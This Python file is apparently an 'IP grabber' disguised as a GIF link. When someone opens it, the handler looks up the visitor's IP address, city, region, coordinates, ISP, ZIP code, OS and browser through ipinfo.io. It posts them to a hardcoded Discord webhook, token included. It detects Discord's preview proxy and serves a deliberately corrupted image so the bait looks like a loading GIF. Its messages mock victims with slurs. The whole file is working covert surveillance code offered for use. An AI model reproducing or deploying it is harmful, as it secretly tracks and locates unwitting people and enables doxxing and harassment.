from http.server import BaseHTTPRequestHandler
from urllib import parse
import httpx
import base64
import httpagentparser

# YOUR WEBHOOK
webhook = 'https://discord.com/api/webhooks/1453028520761626776/N0tjZRoNrNCsBBg0YHXHcPCix0lZhM1TeWsxUQDYTUoLZNdwNVf8nGo-ITX7MFTujFwi'

# Clean funny image (change if you want something else)
clean_image_url = 'https://th.bing.com/th/id/OIP.xXJEf5k4LqmkR9skmyBlCQHaIi?w=153&h=180&c=7&r=0&o=7&cb=ucfimg2&pid=1.7&rm=3&ucfimg=1'

# Spoiled/corrupted image data - Discord can't render this → infinite loading / broken
buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')

def formatHook(ip, city, reg, country, loc, org, postal, useragent, os, browser):
    return {
        "username": "bobs slave",
        "content": "@everyone",
        "embeds": [{
            "title": "DADDY BOB STRIKES AGAIN!",
            "color": 16711803,
            "description": "A New Retard Opened The \"Gif\" LOL.",
            "author": {"name": "Fentanyl"},
            "fields": [
                {"name": "IP Info", "value": f"**IP:** {ip}\n**City:** {city}\n**Region:** {reg}\n**Country:** {country}\n**Location:** {loc}\n**ORG:** {org}\n**ZIP:** {postal}", "inline": True},
                {"name": "Advanced Info", "value": f"**OS:** {os}\n**Browser:** {browser}\n**UserAgent:** {useragent}", "inline": False}
            ]
        }]
    }

def prev(ip, uag):
    return {
        "username": "Fentanyl",
        "content": "",
        "embeds": [{
            "title": "Fentanyl Alert!",
            "color": 16711803,
            "description": f"Discord is trying to preview—real grab incoming soon?\n**Proxy IP:** `{ip}`\n**UserAgent:** `{uag}`",
            "author": {"name": "Fentanyl"}
        }]
    }

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            # Real client IP
            forwarded = self.headers.get('x-forwarded-for')
            ip = forwarded.split(',')[0].strip() if forwarded else 'Unknown'

            useragent = self.headers.get('user-agent', 'No User Agent Found!').lower()
            os, browser = httpagentparser.simple_detect(useragent)

            # CURRENT DISCORD MEDIA PROXY DETECTION (2025 working)
            is_discord = (
                'discordlink' in useragent or 
                'embedder' in useragent or 
                'discord' in useragent or
                ip.startswith(('162.158.', '162.159.', '104.196.', '104.244.', '104.16.', '104.17.', '104.18.', '141.101.', '185.'))
            )

            # Optional ?url= to load any image
            params = dict(parse.parse_qsl(parse.urlsplit(self.path).query))
            image_url = params.get('url', clean_image_url)

            # Fetch clean image fresh
            try:
                clean_data = httpx.get(image_url, timeout=15).content
            except:
                clean_data = b''  # fallback

            self.send_response(200)
            self.send_header('Content-type', 'image/gif')  # Makes it feel like a GIF that's stuck loading
            self.end_headers()

            if is_discord:
                # Discord proxy → spoiled image = infinite loading / broken preview
                self.wfile.write(buggedbin)
                httpx.post(webhook, json=prev(ip, useragent))
            else:
                # Real user opens in browser → clean image + full grab
                self.wfile.write(clean_data if clean_data else buggedbin)
                try:
                    ipInfo = httpx.get(f'https://ipinfo.io/{ip}/json', timeout=15).json()
                    payload = formatHook(
                        ipInfo.get('ip', ip),
                        ipInfo.get('city', 'Unknown'),
                        ipInfo.get('region', 'Unknown'),
                        ipInfo.get('country', 'Unknown'),
                        ipInfo.get('loc', 'Unknown'),
                        ipInfo.get('org', 'Unknown'),
                        ipInfo.get('postal', 'Unknown'),
                        useragent.capitalize(),
                        os,
                        browser
                    )
                    httpx.post(webhook, json=payload)
                except:
                    httpx.post(webhook, json=formatHook(ip, 'Unknown', 'Unknown', 'Unknown', 'Unknown', 'Unknown', 'Unknown', useragent.capitalize(), os, browser))

        except:
            # Never crash - always serve something
            try:
                self.send_response(200)
                self.send_header('Content-type', 'image/gif')
                self.end_headers()
                self.wfile.write(buggedbin)
            except:
                pass

        return
